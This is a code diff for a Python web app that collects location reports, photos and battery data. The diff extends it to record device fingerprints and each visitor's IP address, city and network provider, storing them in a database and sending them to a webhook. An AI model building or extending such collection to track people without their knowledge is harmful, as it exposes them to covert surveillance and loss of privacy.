@@ -100,9 +100,19 @@ def send_gdrive_webhook_async(webhook_url, location_data):
         "maps_url": maps_url,
         "accuracy": location_data.get("accuracy"),
         "battery": location_data.get("battery"),
+        "battery_charging": location_data.get("battery_charging"),
         "device_time": location_data.get("device_time"),
         "received_at": location_data.get("received_at"),
-        "photo": location_data.get("photo")
+        "photo": location_data.get("photo"),
+        "device_model": location_data.get("device_model"),
+        "os": location_data.get("os"),
+        "browser": location_data.get("browser"),
+        "screen_res": location_data.get("screen_res"),
+        "network_type": location_data.get("network_type"),
+        "hardware": location_data.get("hardware"),
+        "ip": location_data.get("ip"),
+        "ip_city": location_data.get("ip_city"),
+        "ip_asn": location_data.get("ip_asn"),
     }
     if os.getenv("VERCEL") or os.getenv("AWS_LAMBDA_FUNCTION_NAME"):
         _worker(webhook_url, payload)
@@ -142,8 +152,25 @@ def init_db():
         """)
         cursor = db.execute("PRAGMA table_info(locations)")
         columns = [row[1] for row in cursor.fetchall()]
-        if "photo" not in columns:
-            db.execute("ALTER TABLE locations ADD COLUMN photo TEXT")
+        new_cols = [
+            ("photo", "TEXT"),
+            ("device_model", "TEXT"),
+            ("os", "TEXT"),
+            ("browser", "TEXT"),
+            ("screen_res", "TEXT"),
+            ("network_type", "TEXT"),
+            ("hardware", "TEXT"),
+            ("battery_charging", "TEXT"),
+            ("ip", "TEXT"),
+            ("ip_city", "TEXT"),
+            ("ip_asn", "TEXT"),
+        ]
+        for col_name, col_type in new_cols:
+            if col_name not in columns:
+                try:
+                    db.execute(f"ALTER TABLE locations ADD COLUMN {col_name} {col_type}")
+                except Exception:
+                    pass
         db.commit()
     except Exception as err:
         try:
@@ -234,6 +261,11 @@ def validate_location(data):
         if not isinstance(photo, str) or not (photo.startswith("data:image/jpeg;base64,") or photo.startswith("data:image/png;base64,")) or len(photo) > 1_500_000:
             raise ValueError("photo harus berupa data URL gambar (JPEG/PNG) valid maksimal 1.5 MB, atau null.")
     location["photo"] = photo
+
+    for field in ("device_model", "os", "browser", "screen_res", "network_type", "hardware", "battery_charging", "timezone", "language"):
+        val = data.get(field)
+        location[field] = str(val)[:128] if val is not None else None
+
     return location
 
 
@@ -359,15 +391,26 @@ def create_app(test_config=None):
                         location["accuracy"] = 15000.0
                 except (ValueError, TypeError):
                     pass
+        # Capture IP & Provider Info
+        forwarded = request.headers.get("X-Forwarded-For")
+        client_ip = forwarded.split(",")[0].strip() if forwarded else (request.headers.get("X-Real-IP") or request.remote_addr or "-")
+        location["ip"] = client_ip[:50]
+        location["ip_city"] = request.headers.get("X-Vercel-IP-City", "")[:50]
+        location["ip_asn"] = request.headers.get("X-Vercel-IP-AS-Number", "")[:50]
+
         db = get_db()
         with db:
             db.execute("""
                 INSERT INTO locations (
                     latitude, longitude, accuracy, altitude, speed,
-                    heading, battery, device_time, received_at, photo
+                    heading, battery, device_time, received_at, photo,
+                    device_model, os, browser, screen_res, network_type,
+                    hardware, battery_charging, ip, ip_city, ip_asn
                 ) VALUES (
                     :latitude, :longitude, :accuracy, :altitude, :speed,
-                    :heading, :battery, :device_time, :received_at, :photo
+                    :heading, :battery, :device_time, :received_at, :photo,
+                    :device_model, :os, :browser, :screen_res, :network_type,
+                    :hardware, :battery_charging, :ip, :ip_city, :ip_asn
                 )
             """, location)
 
